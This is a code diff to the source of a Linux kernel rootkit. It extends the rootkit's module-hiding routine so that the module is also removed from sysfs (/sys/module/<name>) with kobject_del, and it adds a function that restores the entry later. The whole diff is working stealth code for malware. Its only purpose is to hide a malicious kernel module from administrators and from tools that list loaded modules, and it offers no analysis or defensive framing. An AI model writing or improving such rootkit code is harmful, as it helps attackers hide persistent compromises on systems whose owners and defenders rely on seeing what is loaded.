@@ -2,13 +2,16 @@
 #include "rootkit.h"
 #include <linux/fs.h>
 #include <linux/kernel.h>
+#include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/module.h>
 #include <linux/spinlock.h>
+#include <linux/sysfs.h>
 
 /* Module hiding */
 
 static struct list_head *saved_prev;
+static struct kobject *saved_kobj_parent;
 static DEFINE_SPINLOCK(module_lock);
 
 void rk_module_hide(void)
@@ -20,6 +23,12 @@ void rk_module_hide(void)
 		goto out;
 	saved_prev = THIS_MODULE->list.prev;
 	list_del(&THIS_MODULE->list);
+
+	/* Remove /sys/module/<name> so sysfs doesn't leak the module */
+	if (THIS_MODULE->mkobj.kobj.parent) {
+		saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
+		kobject_del(&THIS_MODULE->mkobj.kobj);
+	}
 out:
 	spin_unlock_irqrestore(&module_lock, flags);
 }
@@ -31,6 +40,14 @@ void rk_module_unhide(void)
 	spin_lock_irqsave(&module_lock, flags);
 	if (!saved_prev)
 		goto out;
+
+	/* Restore sysfs entry before re-adding to module list */
+	if (saved_kobj_parent) {
+		(void)kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent,
+				  "%s", THIS_MODULE->name);
+		saved_kobj_parent = NULL;
+	}
+
 	list_add(&THIS_MODULE->list, saved_prev);
 	saved_prev = NULL;
 out:
